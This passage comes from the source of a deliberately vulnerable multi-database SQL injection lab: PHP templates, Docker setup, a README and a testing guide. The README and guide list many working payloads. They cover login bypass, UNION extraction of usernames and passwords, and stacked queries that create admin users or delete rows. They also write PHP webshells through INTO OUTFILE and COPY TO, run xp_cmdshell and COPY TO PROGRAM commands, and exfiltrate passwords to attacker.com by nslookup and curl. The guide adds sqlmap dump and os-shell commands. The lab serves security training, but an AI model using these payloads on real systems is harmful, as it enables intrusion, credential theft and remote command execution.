        <?php if (isset($results) && is_array($results)): ?>
            <div class="result-box">
                <h3>‚óÜ CAPTURED <?= count($results) ?> ENTRIES ‚óÜ</h3>
                
                <?php if (count($results) > 0): ?>
                    <table>
                        <thead>
                            <tr>
                                <?php 
                                // Display column headers dynamically
                                $firstRow = $results[0];
                                foreach (array_keys($firstRow) as $column): 
                                ?>
                                    <th>‚óÜ <?= htmlspecialchars(strtoupper($column)) ?></th>
                                <?php endforeach; ?>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($results as $row): ?>
                                <tr>
                                    <?php foreach ($row as $value): ?>
                                        <td><?= htmlspecialchars($value ?? 'NULL') ?></td>
                                    <?php endforeach; ?>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                <?php else: ?>
                    <p>‚úï NO POK√âMON DATA FOUND IN POK√âDEX</p>
                <?php endif; ?>
            </div>
        <?php endif; ?>
        
        <div class="hint">
            <h3>‚ïê‚ïê‚ïê ADVANCED TECHNIQUES ‚ïê‚ïê‚ïê</h3>
            
            <h4>‚óÜ COLUMN COUNT DETECTION:</h4>
            <p>Use ORDER BY or UNION SELECT NULL to discover column structure:</p>
            <pre>Search: ' ORDER BY 1 -- 
Search: ' ORDER BY 6 -- 
Search: ' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL -- </pre>
            
            <h4>‚óÜ DATABASE-SPECIFIC EXPLOITS:</h4>
            
            <?php if ($dbType === 'mysql'): ?>
            <div class="db-notes">
                <h4>‚ñ∫ MYSQL TECHNIQUES</h4>
                <ul>
                    <li><strong>Get tables:</strong> <code>' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database() -- </code></li>
                    <li><strong>Get columns:</strong> <code>' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' -- </code></li>
                    <li><strong>Read file:</strong> <code>' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL,NULL,NULL,NULL -- </code></li>
                    <li><strong>Current user:</strong> <code>' UNION SELECT user(),NULL,NULL,NULL,NULL,NULL -- </code></li>
                </ul>
            </div>
            <?php elseif ($dbType === 'sqlite'): ?>
            <div class="db-notes">
                <h4>‚ñ∫ SQLITE TECHNIQUES</h4>
                <ul>
                    <li><strong>Get tables:</strong> <code>' UNION SELECT name,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table' -- </code></li>
                    <li><strong>Get schema:</strong> <code>' UNION SELECT sql,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table' -- </code></li>
                    <li><strong>Version:</strong> <code>' UNION SELECT sqlite_version(),NULL,NULL,NULL,NULL,NULL -- </code></li>
                </ul>
            </div>
            <?php elseif ($dbType === 'pgsql'): ?>
            <div class="db-notes">
                <h4>‚ñ∫ POSTGRESQL TECHNIQUES</h4>
                <ul>
                    <li><strong>Get tables:</strong> <code>' UNION SELECT tablename,NULL,NULL,NULL,NULL,NULL FROM pg_tables WHERE schemaname='public' -- </code></li>
                    <li><strong>Get columns:</strong> <code>' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' -- </code></li>
                    <li><strong>Current user:</strong> <code>' UNION SELECT current_user,NULL,NULL,NULL,NULL,NULL -- </code></li>
                    <li><strong>Version:</strong> <code>' UNION SELECT version(),NULL,NULL,NULL,NULL,NULL -- </code></li>
                </ul>
            </div>
            <?php elseif ($dbType === 'mssql'): ?>
            <div class="db-notes">
                <h4>‚ñ∫ MSSQL TECHNIQUES</h4>
                <ul>
                    <li><strong>Get tables:</strong> <code>' UNION SELECT name,NULL,NULL,NULL,NULL,NULL FROM sysobjects WHERE xtype='U' -- </code></li>
                    <li><strong>Get columns:</strong> <code>' UNION SELECT name,NULL,NULL,NULL,NULL,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users') -- </code></li>
                    <li><strong>Current user:</strong> <code>' UNION SELECT SYSTEM_USER,NULL,NULL,NULL,NULL,NULL -- </code></li>
                    <li><strong>Version:</strong> <code>' UNION SELECT @@version,NULL,NULL,NULL,NULL,NULL -- </code></li>
                </ul>
            </div>
            <?php endif; ?>
        </div>
        
        <footer>
            <p>‚óÜ PROFESSOR OAK'S SQL LAB ‚óÜ FROM FCI WITH LUV:3 ‚óÜ</p>
        </footer>
    </div>
</body>
</html>
</file>

<file path="sqli-lab/web/templates/search.php">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GYM 2: Pok√©dex Search - SQL Lab</title>
    <link rel="stylesheet" href="/css/style.css">
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <header>
            <h1>üîç GYM 2: POK√âDEX SEARCH üîç</h1>
            <p class="warning">‚ö† ACTIVE DB: <?= htmlspecialchars(strtoupper($dbType)) ?> ‚ö†</p>
            <a href="/?db=<?= htmlspecialchars($dbType) ?>" class="btn">‚óÄ RETURN HOME</a>
        </header>
        
        <form method="GET" action="/search">
            <input type="hidden" name="db" value="<?= htmlspecialchars($dbType) ?>">
            
            <div class="form-group">
                <label for="q">‚ñ∫ SEARCH POK√âDEX:</label>
                <input type="text" id="q" name="q" value="<?= htmlspecialchars($_GET['q'] ?? '') ?>" placeholder="Enter Pok√©mon name or type...">
            </div>
            
            <button type="submit" class="btn">‚ñ∂ SEARCH</button>
        </form>
        
        <div class="hint">
            <h3>‚ïê‚ïê‚ïê PROFESSOR'S NOTES: ERROR & UNION ATTACKS ‚ïê‚ïê‚ïê</h3>
            
        <footer>
            <p>‚óÜ PROFESSOR OAK'S SQL LAB ‚óÜ FROM FCI WITH LUV:3 ‚óÜ</p>
        </footer>
    </div>
</body>
</html>
</file>

<file path="sqli-lab/web/000-default.conf">
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html/public

    <Directory /var/www/html/public>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
        
        # Enable rewrite engine
        RewriteEngine On
        
        # Redirect all requests to index.php except static files
        RewriteCond %{REQUEST_FILENAME} !-f
        RewriteCond %{REQUEST_FILENAME} !-d
        RewriteRule ^(.*)$ /index.php [QSA,L]
    </Directory>

    # Allow access to uploads directory
    <Directory /var/www/uploads>
        Options -Indexes
        AllowOverride None
        Require all granted
    </Directory>
    
    Alias /uploads /var/www/uploads

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
</file>

<file path="sqli-lab/web/Dockerfile">
FROM php:7.4-apache

# Install system dependencies
RUN apt-get update && apt-get install -y \
    gnupg2 \
    curl \
    wget \
    unixodbc \
    unixodbc-dev \
    libpq-dev \
    libsqlite3-dev \
    && rm -rf /var/lib/apt/lists/*

# Install Microsoft ODBC Driver for SQL Server
RUN curl https://packages.microsoft.com/keys/microsoft.asc | apt-key add - \
    && curl https://packages.microsoft.com/config/debian/10/prod.list > /etc/apt/sources.list.d/mssql-release.list \
    && apt-get update \
    && ACCEPT_EULA=Y apt-get install -y msodbcsql17 mssql-tools \
    && echo 'export PATH="$PATH:/opt/mssql-tools/bin"' >> ~/.bashrc

# Install PHP extensions
RUN docker-php-ext-install mysqli pdo pdo_mysql pgsql pdo_pgsql

# Install SQLite3 extension
RUN docker-php-ext-install pdo_sqlite

# Install sqlsrv and pdo_sqlsrv extensions (PHP 7.4-compatible release)
RUN pecl channel-update pecl.php.net \
    && printf "\n" | pecl install sqlsrv-5.10.1 \
    && printf "\n" | pecl install pdo_sqlsrv-5.10.1 \
    && docker-php-ext-enable sqlsrv pdo_sqlsrv

# Enable Apache mod_rewrite
RUN a2enmod rewrite

# Set working directory
WORKDIR /var/www/html

# Create uploads directory
RUN mkdir -p /var/www/uploads && chmod 755 /var/www/uploads

# Copy application files
COPY . /var/www/html/

# Copy Apache configuration
COPY 000-default.conf /etc/apache2/sites-available/000-default.conf

# Set permissions
RUN chown -R www-data:www-data /var/www/html \
    && chmod -R 755 /var/www/html \
    && chown -R www-data:www-data /var/www/uploads

EXPOSE 80
</file>

<file path="sqli-lab/docker-compose.yml">
version: '3.8'

services:
  web:
    build:
      context: ./web
      dockerfile: Dockerfile
    container_name: sqli-web
    ports:
      - "1337:80"
    volumes:
      - ./uploads:/var/www/uploads
      - ./custom.ini:/usr/local/etc/php/conf.d/custom.ini
    depends_on:
      - mysql
      - postgres
      - mssql
    environment:
      - MYSQL_HOST=mysql
      - MYSQL_USER=sqli_user
      - MYSQL_PASSWORD=sqli_pass
      - MYSQL_DB=sqli_db
      - POSTGRES_HOST=postgres
      - POSTGRES_USER=sqli_user
      - POSTGRES_PASSWORD=sqli_pass
      - POSTGRES_DB=sqli_db
      - MSSQL_HOST=mssql
      - MSSQL_USER=sa
      - MSSQL_PASSWORD=SqliPass123!
      - MSSQL_DB=sqli_db

  mysql:
    image: mysql:8.0
    container_name: sqli-mysql
    environment:
      MYSQL_ROOT_PASSWORD: rootpass
      MYSQL_DATABASE: sqli_db
      MYSQL_USER: sqli_user
      MYSQL_PASSWORD: sqli_pass
    volumes:
      - ./seeds/mysql.sql:/docker-entrypoint-initdb.d/init.sql
      - ./uploads:/var/www/uploads
      - mysql-data:/var/lib/mysql
    command: --secure-file-priv="" --local-infile=1

  postgres:
    image: postgres:15
    container_name: sqli-postgres
    environment:
      POSTGRES_DB: sqli_db
      POSTGRES_USER: sqli_user
      POSTGRES_PASSWORD: sqli_pass
    volumes:
      - ./seeds/pg.sql:/docker-entrypoint-initdb.d/init.sql
      - ./uploads:/var/www/uploads
      - postgres-data:/var/lib/postgresql/data

  mssql:
    image: mcr.microsoft.com/mssql/server:2017-latest
    container_name: sqli-mssql
    environment:
      ACCEPT_EULA: Y
      SA_PASSWORD: SqliPass123!
      MSSQL_PID: Developer
    volumes:
      - ./seeds/mssql.sql:/docker-entrypoint-initdb.d/init.sql
      - ./seeds/mssql-init.sh:/docker-entrypoint-initdb.d/init.sh
      - mssql-data:/var/opt/mssql
    ports:
      - "1433:1433"
    command: /bin/bash -c "(/opt/mssql/bin/sqlservr &) && sleep 30 && /opt/mssql-tools/bin/sqlcmd -S localhost -U sa -P SqliPass123! -d master -i /docker-entrypoint-initdb.d/init.sql && tail -f /dev/null"

volumes:
  mysql-data:
  postgres-data:
  mssql-data:
</file>

<file path="sqli-lab/README.md">
# üîì Polyglot SQL Injection Lab

**‚ö†Ô∏è WARNING: This application contains intentional security vulnerabilities for educational purposes only. DO NOT deploy to production or public internet!**

A comprehensive SQL injection training lab supporting multiple database engines: MySQL, SQLite, PostgreSQL, and MSSQL. Demonstrates various SQL injection techniques from basic authentication bypass to Remote Code Execution (RCE).

## üéØ Features

### Supported Databases
- **MySQL 8.0** - Error-based, UNION-based, File operations
- **SQLite 3** - ATTACH DATABASE, Schema enumeration
- **PostgreSQL 15** - COPY TO, Out-of-band exfiltration
- **MSSQL 2022** - xp_cmdshell, Command execution

### Vulnerability Types

#### 1. **Blind SQL Injection** (`/login`)
- Boolean-based blind SQLi
- Time-based blind SQLi
- Authentication bypass
- Data extraction character by character

#### 2. **Error-based & UNION-based SQLi** (`/search`)
- Error message exploitation
- UNION-based data extraction
- Information schema enumeration
- Column count detection

#### 3. **Advanced Techniques** (`/report`)
- Stacked queries
- Second-order SQL injection
- Out-of-band (OOB) exfiltration
- SQL injection to RCE

## üöÄ Quick Start

### Prerequisites
- Docker & Docker Compose
- 4GB RAM minimum
- 10GB disk space

### Installation

1. **Clone or navigate to the lab directory:**
```bash
cd sqli-lab
```

2. **Start all services:**
```bash
docker-compose up -d
```

3. **Wait for databases to initialize (30-60 seconds):**
```bash
docker-compose logs -f
```

4. **Access the lab:**
```
http://localhost:8080
```

5. **Switch between databases using the UI or URL parameter:**
```
http://localhost:8080?db=mysql
http://localhost:8080?db=sqlite
http://localhost:8080?db=pgsql
http://localhost:8080?db=mssql
```

### Stopping the Lab
```bash
docker-compose down
```

### Reset Everything (including data)
```bash
docker-compose down -v
rm -f sqli.db
docker-compose up -d
```

## üìö Lab Exercises

### Lab 1: Login - Blind SQL Injection

**URL:** `http://localhost:8080/login?db=mysql`

**Test Credentials:**
- Username: `admin` | Password: `admin123`
- Username: `john_doe` | Password: `password123`

**Exercise 1.1 - Authentication Bypass:**
```sql
Username: admin' OR '1'='1
Password: anything

Username: ' OR 1=1 -- 
Password: anything
```

**Exercise 1.2 - Boolean-based Blind SQLi:**
```sql
-- Test true condition
Username: admin' AND '1'='1

-- Test false condition
Username: admin' AND '1'='2

-- Extract first character of password
Username: admin' AND SUBSTRING(password,1,1)='a
```

**Exercise 1.3 - Time-based Blind SQLi:**

MySQL:
```sql
Username: admin' AND SLEEP(5) -- 
Username: admin' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0) -- 
```

PostgreSQL:
```sql
Username: admin' AND pg_sleep(5) -- 
```

MSSQL:
```sql
Username: admin'; WAITFOR DELAY '00:00:05' -- 
```

### Lab 2: Search - Error & UNION-based SQLi

**URL:** `http://localhost:8080/search?db=mysql`

**Exercise 2.1 - Detect Vulnerability:**
```sql
Search: '
Search: '' OR 1=1 -- 
```

**Exercise 2.2 - Determine Column Count:**
```sql
Search: ' ORDER BY 1 -- 
Search: ' ORDER BY 6 -- 
Search: ' ORDER BY 7 -- 
```

**Exercise 2.3 - UNION-based Extraction:**

MySQL:
```sql
-- Find injectable columns
Search: ' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL -- 

-- Get database version
Search: ' UNION SELECT VERSION(),NULL,NULL,NULL,NULL,NULL -- 

-- List tables
Search: ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database() -- 

-- Extract user credentials
Search: ' UNION SELECT username,password,email,role,NULL,NULL FROM users -- 

-- Concatenate data
Search: ' UNION SELECT CONCAT(username,':',password),NULL,NULL,NULL,NULL,NULL FROM users -- 
```

SQLite:
```sql
-- List tables
Search: ' UNION SELECT name,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table' -- 

-- Get table schema
Search: ' UNION SELECT sql,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE name='users' -- 

-- Extract credentials
Search: ' UNION SELECT username||':'||password,NULL,NULL,NULL,NULL,NULL FROM users -- 
```

PostgreSQL:
```sql
-- List tables
Search: ' UNION SELECT tablename,NULL,NULL,NULL,NULL,NULL FROM pg_tables WHERE schemaname='public' -- 

-- Extract credentials
Search: ' UNION SELECT username||':'||password,NULL,NULL,NULL,NULL,NULL FROM users -- 
```

MSSQL:
```sql
-- List tables
Search: ' UNION SELECT name,NULL,NULL,NULL,NULL,NULL FROM sysobjects WHERE xtype='U' -- 

-- Extract credentials
Search: ' UNION SELECT username+':'+password,NULL,NULL,NULL,NULL,NULL FROM users -- 
```

**Exercise 2.4 - Error-based Extraction (MySQL):**
```sql
Search: ' AND extractvalue(1,concat(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 1))) -- 

Search: ' AND updatexml(null,concat(0x7e,database()),null) -- 
```

### Lab 3: Report - Advanced SQLi & RCE

**URL:** `http://localhost:8080/report?db=mysql`

**Exercise 3.1 - Stacked Queries:**

```sql
-- Create new admin user
Title: Test'; INSERT INTO users (username,password,email,role) VALUES ('hacker','hacked','h@ck.com','admin') -- 

-- Update user role
Title: Test'; UPDATE users SET role='admin' WHERE username='john_doe' -- 

-- Delete data
Title: Test'; DELETE FROM reports WHERE id>0 -- 
```

**Exercise 3.2 - SQL Injection to RCE:**

**MySQL - File Write:**
```sql
-- Check privileges
Title: '; SELECT user,file_priv FROM mysql.user WHERE user='sqli_user' -- 

-- Write PHP webshell
Title: '; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/uploads/shell.php' -- 

-- Access webshell
http://localhost:8080/uploads/shell.php?cmd=whoami
http://localhost:8080/uploads/shell.php?cmd=ls -la
```

**PostgreSQL - COPY TO:**
```sql
-- Write file
Title: '; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/uploads/shell.php' -- 

-- Execute command via COPY TO PROGRAM (requires superuser)
Title: '; COPY (SELECT '') TO PROGRAM 'whoami > /tmp/out.txt' -- 
```

**MSSQL - xp_cmdshell:**
```sql
-- Check if enabled
Title: '; SELECT value FROM sys.configurations WHERE name='xp_cmdshell' -- 

-- Execute command
Title: '; EXEC xp_cmdshell 'whoami' -- 
Title: '; EXEC xp_cmdshell 'dir C:\' -- 
```

**SQLite - ATTACH DATABASE:**
```sql
-- Create malicious database file
Title: '; ATTACH DATABASE '/var/www/uploads/shell.php' AS shell; CREATE TABLE shell.pwn (code TEXT); INSERT INTO shell.pwn VALUES ('<?php system($_GET["cmd"]); ?>') -- 
```

**Exercise 3.3 - Out-of-Band Exfiltration:**

**PostgreSQL DNS Exfiltration:**
```sql
Title: '; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT password FROM users LIMIT 1)||'.attacker.com' -- 
```

**MSSQL DNS Exfiltration:**
```sql
Title: '; DECLARE @d varchar(1024); SELECT @d=(SELECT TOP 1 password FROM users); EXEC('xp_cmdshell ''nslookup '+@d+'.attacker.com''') -- 
```

## üîß Database-Specific Cheat Sheet

### MySQL
```sql
-- Comments: --, #, /* */
-- Concatenation: CONCAT(), ||
-- Sleep: SLEEP(5)
-- Version: VERSION(), @@version
-- Database: database()
-- User: user(), current_user()
-- Tables: information_schema.tables
-- Columns: information_schema.columns
-- Read file: LOAD_FILE('/path/file')
-- Write file: INTO OUTFILE '/path/file'
```

### SQLite
```sql
-- Comments: --, /* */
-- Concatenation: ||
-- Version: sqlite_version()
-- Tables: sqlite_master
-- No native SLEEP function
-- SQLite time-based delay via cartesian product:
-- username: admin' AND (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master) > 0 --
-- ATTACH DATABASE for file operations
```

### PostgreSQL
```sql
-- Comments: --, /* */
-- Concatenation: ||, CONCAT()
-- Sleep: pg_sleep(5)
-- Version: version()
-- Database: current_database()
-- User: current_user
-- Tables: pg_tables, information_schema.tables
-- Columns: information_schema.columns
-- Read file: pg_read_file('/path')
-- Write file: COPY TO '/path'
-- Execute: COPY TO PROGRAM 'command'
```

### MSSQL
```sql
-- Comments: --, /* */
-- Concatenation: +
-- Sleep: WAITFOR DELAY '00:00:05'
-- Version: @@version
-- Database: DB_NAME()
-- User: SYSTEM_USER, USER_NAME()
-- Tables: sysobjects, information_schema.tables
-- Columns: syscolumns, information_schema.columns
-- Execute: xp_cmdshell 'command'
-- DNS: xp_dirtree '\\domain.com\share'
```

## üõ†Ô∏è Troubleshooting

### Database won't start
```bash
# Check logs
docker-compose logs mysql
docker-compose logs postgres
docker-compose logs mssql

# Restart specific service
docker-compose restart mysql
```

### MSSQL connection issues
MSSQL requires more memory. Increase Docker memory limit to at least 4GB.

### SQLite database not created
```bash
# The SQLite database is created automatically on first access
# If issues occur, manually initialize:
docker-compose exec web php -r "require '/var/www/html/src/db/sqlite.php'; new SQLiteDB();"
```

### Permission denied errors
```bash
# Fix uploads directory permissions
docker-compose exec web chmod 777 /var/www/uploads
```

### Clear all data and restart
```bash
docker-compose down -v
rm -f sqli.db
docker-compose up -d
```

## üìñ Learning Resources

### SQL Injection References
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PayloadAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

### Tools for Testing
- **sqlmap** - Automated SQL injection tool
- **Burp Suite** - Web application security testing
- **OWASP ZAP** - Web application scanner

### Using sqlmap with this lab
```bash
# Test login form
sqlmap -u "http://localhost:8080/login?db=mysql" --data="username=admin&password=test" --batch

# Test search
sqlmap -u "http://localhost:8080/search?db=mysql&q=test" --batch --dbs

# Dump database
sqlmap -u "http://localhost:8080/search?db=mysql&q=test" --batch -D sqli_db --dump
```

## ‚ö†Ô∏è Security Warning

**THIS APPLICATION IS INTENTIONALLY VULNERABLE!**

- **NEVER** deploy this to a production environment
- **NEVER** expose this to the public internet
- **ONLY** use in isolated lab environments
- **ALWAYS** run in Docker containers with network isolation
- This is for **EDUCATIONAL PURPOSES ONLY**

## üìù License

Educational use only. No warranty provided.

## ü§ù Contributing

This is an educational project. Feel free to:
- Add more vulnerability examples
- Improve documentation
- Add support for more databases
- Create additional exploitation scenarios

## üìß Contact

For educational purposes only. Use responsibly!

---

**Remember:** With great power comes great responsibility. Use this knowledge to build secure applications, not to harm others.
</file>

<file path="sqli-lab/TESTING.md">
# Testing Guide - Polyglot SQL Injection Lab

This guide provides systematic testing procedures for each vulnerability type across all database engines.

## Pre-Testing Checklist

- [ ] Docker services are running: `docker-compose ps`
- [ ] All databases are healthy: `docker-compose logs | grep -i error`
- [ ] Web interface is accessible: `http://localhost:8080`
- [ ] Burp Suite or similar proxy configured (optional)

## Test Matrix

| Vulnerability Type | MySQL | SQLite | PostgreSQL | MSSQL |
|-------------------|-------|--------|------------|-------|
| Auth Bypass | ‚úì | ‚úì | ‚úì | ‚úì |
| Boolean Blind | ‚úì | ‚úì | ‚úì | ‚úì |
| Time Blind | ‚úì | Limited | ‚úì | ‚úì |
| Error-based | ‚úì | ‚úì | ‚úì | ‚úì |
| UNION-based | ‚úì | ‚úì | ‚úì | ‚úì |
| Stacked Queries | ‚úì | ‚úì | ‚úì | ‚úì |
| File Write | ‚úì | ‚úì | ‚úì | ‚úó |
| Command Execution | ‚úó | ‚úó | ‚úì | ‚úì |
| OOB Exfiltration | Limited | ‚úó | ‚úì | ‚úì |

## Test Cases

### TC-001: Authentication Bypass (All Databases)

**Objective:** Bypass login without valid credentials

**Steps:**
1. Navigate to `/login?db=mysql`
2. Enter payload in username field
3. Enter any value in password field
4. Click Login

**Test Data:**

| DB | Username Payload | Expected Result |
|----|-----------------|-----------------|
| MySQL | `admin' OR '1'='1` | Login successful as admin |
| MySQL | `' OR 1=1 -- ` | Login successful as first user |
| SQLite | `admin' OR '1'='1` | Login successful as admin |
| PostgreSQL | `admin' OR '1'='1` | Login successful as admin |
| MSSQL | `admin' OR '1'='1` | Login successful as admin |

**Validation:**
- [ ] Success message displayed
- [ ] User data table shown
- [ ] Session created

---

### TC-002: Boolean-based Blind SQLi (All Databases)

**Objective:** Confirm boolean-based blind SQL injection vulnerability

**Steps:**
1. Navigate to `/login?db=mysql`
2. Test true condition
3. Test false condition
4. Observe different responses

**Test Data:**

| DB | Payload | Expected Result |
|----|---------|-----------------|
| MySQL | `admin' AND '1'='1` | Login successful |
| MySQL | `admin' AND '1'='2` | Login failed |
| SQLite | `admin' AND 1=1 -- ` | Login successful |
| PostgreSQL | `admin' AND true -- ` | Login successful |
| MSSQL | `admin' AND 1=1 -- ` | Login successful |

**Validation:**
- [ ] True condition returns data
- [ ] False condition returns no data
- [ ] Different response observable

---

### TC-003: Time-based Blind SQLi

**Objective:** Confirm time-based blind SQL injection

**Steps:**
1. Navigate to `/login?db=mysql`
2. Enter time-delay payload
3. Measure response time
4. Compare with normal response time

**Test Data:**

| DB | Payload | Expected Delay |
|----|---------|----------------|
| MySQL | `admin' AND SLEEP(5) -- ` | ~5 seconds |
| PostgreSQL | `admin' AND pg_sleep(5) -- ` | ~5 seconds |
| MSSQL | `admin'; WAITFOR DELAY '00:00:05' -- ` | ~5 seconds |
| SQLite | N/A (limited) | N/A |

**Validation:**
- [ ] Response delayed by specified time
- [ ] Login fails (as expected)
- [ ] No error messages

---

### TC-004: Error-based SQLi (MySQL)

**Objective:** Extract data using error messages

**Steps:**
1. Navigate to `/search?db=mysql`
2. Enter error-based payload
3. Observe error message containing data

**Test Data:**
```sql
Search: ' AND extractvalue(1,concat(0x7e,version())) -- 
Search: ' AND extractvalue(1,concat(0x7e,database())) -- 
Search: ' AND extractvalue(1,concat(0x7e,(SELECT username FROM users LIMIT 1))) -- 
```

**Validation:**
- [ ] SQL error displayed
- [ ] Error contains extracted data
- [ ] Version/database/username visible

---

### TC-005: UNION-based Data Extraction

**Objective:** Extract complete tables using UNION

**Steps:**
1. Navigate to `/search?db=mysql`
2. Determine column count
3. Find injectable positions
4. Extract data

**Test Data:**

**Column Detection:**
```sql
' ORDER BY 1 --   (works)
' ORDER BY 6 --   (works)
' ORDER BY 7 --   (fails)
```

**MySQL Extraction:**
```sql
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL -- 
' UNION SELECT username,password,email,role,NULL,NULL FROM users -- 
' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables -- 
```

**Validation:**
- [ ] Column count identified (6 columns)
- [ ] User data extracted
- [ ] Table names enumerated
- [ ] Data displayed in result table

---

### TC-006: Stacked Queries

**Objective:** Execute multiple SQL statements

**Steps:**
1. Navigate to `/report?db=mysql`
2. Enter stacked query payload
3. Verify second statement executed

**Test Data:**

**Create User:**
```sql
Title: Test'; INSERT INTO users (username,password,email,role) VALUES ('hacker','pwned','h@ck.com','admin') -- 
```

**Verify:**
1. Submit report
2. Go to `/login?db=mysql`
3. Login with `hacker` / `pwned`

**Validation:**
- [ ] Report submitted successfully
- [ ] New user created
- [ ] Can login with new credentials
- [ ] New user has admin role

---

### TC-007: SQL Injection to RCE - MySQL File Write

**Objective:** Write webshell via SQL injection

**Steps:**
1. Navigate to `/report?db=mysql`
2. Enter file write payload
3. Access written file
4. Execute commands

**Test Data:**
```sql
Title: '; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/uploads/shell.php' -- 
```

**Command Execution:**
```
http://localhost:8080/uploads/shell.php?cmd=whoami
http://localhost:8080/uploads/shell.php?cmd=id
http://localhost:8080/uploads/shell.php?cmd=pwd
```

**Validation:**
- [ ] File written successfully
- [ ] Shell accessible via browser
- [ ] Commands execute successfully
- [ ] Output displayed

---

### TC-008: SQL Injection to RCE - PostgreSQL COPY

**Objective:** Write file using PostgreSQL COPY

**Steps:**
1. Navigate to `/report?db=pgsql`
2. Enter COPY TO payload
3. Access webshell

**Test Data:**
```sql
Title: '; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/uploads/pgshell.php' -- 
```

**Validation:**
- [ ] File created
- [ ] Webshell functional
- [ ] Commands execute

---

### TC-009: SQL Injection to RCE - MSSQL xp_cmdshell

**Objective:** Execute OS commands via xp_cmdshell

**Steps:**
1. Navigate to `/report?db=mssql`
2. Check if xp_cmdshell is enabled
3. Execute commands

**Test Data:**
```sql
-- Check status
Title: '; SELECT value FROM sys.configurations WHERE name='xp_cmdshell' -- 

-- Execute command
Title: '; EXEC xp_cmdshell 'whoami' -- 
Title: '; EXEC xp_cmdshell 'hostname' -- 
```

**Validation:**
- [ ] xp_cmdshell is enabled
- [ ] Commands execute
- [ ] Output visible in results

---

### TC-010: Out-of-Band Exfiltration (PostgreSQL)

**Objective:** Exfiltrate data via DNS/HTTP

**Prerequisites:**
- External server to receive requests (e.g., Burp Collaborator, requestbin.com)

**Test Data:**
```sql
-- DNS exfiltration
Title: '; COPY (SELECT '') TO PROGRAM 'nslookup test.attacker.com' -- 

-- HTTP exfiltration  
Title: '; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?test=1' -- 

-- Data exfiltration
Title: '; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?data='||(SELECT password FROM users LIMIT 1) -- 
```

**Validation:**
- [ ] DNS query received
- [ ] HTTP request received
- [ ] Data exfiltrated successfully

---

### TC-011: Database Enumeration via UNION

**Objective:** Complete database enumeration

**Test Sequence (MySQL):**

1. **Get database version:**
```sql
' UNION SELECT VERSION(),NULL,NULL,NULL,NULL,NULL -- 
```

2. **List all databases:**
```sql
' UNION SELECT schema_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.schemata -- 
```

3. **List tables in current database:**
```sql
' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database() -- 
```

4. **List columns in users table:**
```sql
' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' -- 
```

5. **Extract all users:**
```sql
' UNION SELECT CONCAT(id,':',username,':',password,':',email,':',role),NULL,NULL,NULL,NULL,NULL FROM users -- 
```

**Validation:**
- [ ] Version extracted
- [ ] All databases listed
- [ ] All tables enumerated
- [ ] Column names obtained
- [ ] Complete user data extracted

---

## Automated Testing with sqlmap

### Test Login Form (MySQL)
```bash
sqlmap -u "http://localhost:8080/login?db=mysql" \
       --data="username=admin&password=test" \
       --batch \
       --level=5 \
       --risk=3
```

### Test Search (All Databases)
```bash
# MySQL
sqlmap -u "http://localhost:8080/search?db=mysql&q=test" --batch --dbs

# SQLite  
sqlmap -u "http://localhost:8080/search?db=sqlite&q=test" --batch --dbs

# PostgreSQL
sqlmap -u "http://localhost:8080/search?db=pgsql&q=test" --batch --dbs

# MSSQL
sqlmap -u "http://localhost:8080/search?db=mssql&q=test" --batch --dbs
```

### Dump Specific Table
```bash
sqlmap -u "http://localhost:8080/search?db=mysql&q=test" \
       -D sqli_db \
       -T users \
       --dump \
       --batch
```

### OS Shell
```bash
sqlmap -u "http://localhost:8080/report?db=mysql" \
       --data="title=test&content=test" \
       --os-shell \
       --batch
```

---

## Performance Testing

### Measure Time-based Delay Accuracy

**Test Script:**
```bash
#!/bin/bash
echo "Testing time-based SQLi delays..."

# MySQL SLEEP(5)
echo -n "MySQL SLEEP(5): "
time curl -s "http://localhost:8080/login?db=mysql" \
     -d "username=admin' AND SLEEP(5) -- &password=test" > /dev/null

# PostgreSQL pg_sleep(5)  
echo -n "PostgreSQL pg_sleep(5): "
